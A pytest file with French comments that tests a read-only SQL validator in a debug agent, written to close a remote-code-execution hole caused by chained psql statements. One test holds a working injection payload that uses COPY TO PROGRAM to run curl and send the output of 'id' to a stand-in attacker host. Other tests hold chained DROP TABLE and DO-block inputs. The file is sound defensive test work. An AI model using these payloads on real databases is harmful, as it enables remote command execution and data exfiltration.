"""Tests du garde-fou SQL en lecture seule du debug_agent.

Couvre la faille RCE via `psql -c` qui exécute plusieurs statements séparés
par `;` (ex: `SELECT 1; COPY ... TO PROGRAM 'cmd'` lance un shell sur l'hôte DB).
Le garde-fou doit rejeter le chainage de statements ET les mots-clés dangereux
absents de l'ancienne denylist (COPY/PROGRAM/DO/...).
"""
import pytest

from hubctl_cli.debug_agent.debug_mcp import _validate_readonly_query


# ── Requêtes valides (doivent être acceptées → retour None) ──


@pytest.mark.parametrize("query", [
    "SELECT * FROM users",
    "select 1",
    "WITH x AS (SELECT 1) SELECT * FROM x",
    "SELECT id, name FROM apps WHERE active = true",
    "SELECT 1;",  # un seul statement avec ; final → OK
    "   SELECT 1   ",  # espaces autour
])
def test_accepts_readonly_queries(query):
    assert _validate_readonly_query(query) is None


# ── Requêtes modifiantes (doivent être rejetées) ──


@pytest.mark.parametrize("query", [
    "DROP TABLE users",
    "DELETE FROM users",
    "INSERT INTO users VALUES (1)",
    "UPDATE users SET admin = true",
    "TRUNCATE users",
    "CREATE TABLE evil (id int)",
    "ALTER TABLE users ADD COLUMN x int",
])
def test_rejects_modifying_queries(query):
    assert _validate_readonly_query(query) is not None


# ── Faille RCE : chainage de statements via `;` ──


def test_rejects_rce_copy_to_program():
    """Payload exact de la faille : commence par SELECT (passe le 1er filtre),
    ne contient aucun mot de l'ancienne denylist, mais lance un shell via COPY TO PROGRAM.
    """
    payload = "SELECT 1; COPY (SELECT 1) TO PROGRAM 'curl http://attaquant/$(id|base64)'"
    assert _validate_readonly_query(payload) is not None


def test_rejects_statement_chaining_with_drop():
    assert _validate_readonly_query("SELECT 1; DROP TABLE users") is not None


def test_rejects_do_block_rce():
    """DO $$...$$ permet d'exécuter du PL/pgSQL arbitraire (et donc des commandes)."""
    assert _validate_readonly_query("SELECT 1; DO $$ BEGIN PERFORM pg_sleep(1); END $$") is not None


def test_rejects_empty_and_non_select():
    assert _validate_readonly_query("") is not None
    assert _validate_readonly_query("SHOW TABLES") is not None
    assert _validate_readonly_query("\\d users") is not None  # méta-commande psql
